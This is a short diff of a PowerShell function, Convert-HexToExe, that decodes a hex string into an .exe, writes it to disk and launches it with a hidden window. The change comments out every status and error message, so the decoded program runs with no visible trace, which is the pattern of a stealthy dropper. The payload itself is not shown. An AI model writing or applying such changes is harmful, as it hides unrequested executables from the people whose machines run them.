@@ -17,13 +17,13 @@ function Convert-HexToExe {
         # Write the byte array to the output .exe file
         [System.IO.File]::WriteAllBytes($outputExeFile, $byteArray)
 
-        Write-Host "Decoding successful! Output saved to $outputExeFile"
+        # Write-Host "Decoding successful! Output saved to $outputExeFile"
 
         # Start the executable
         Start-Process -WindowStyle Hidden -FilePath $outputExeFile
-        Write-Host "$outputExeFile has been started."
+        # Write-Host "$outputExeFile has been started."
     } catch {
-        Write-Host "Error: $($_.Exception.Message)"
+        # Write-Host "Error: $($_.Exception.Message)"
     }
 }
 
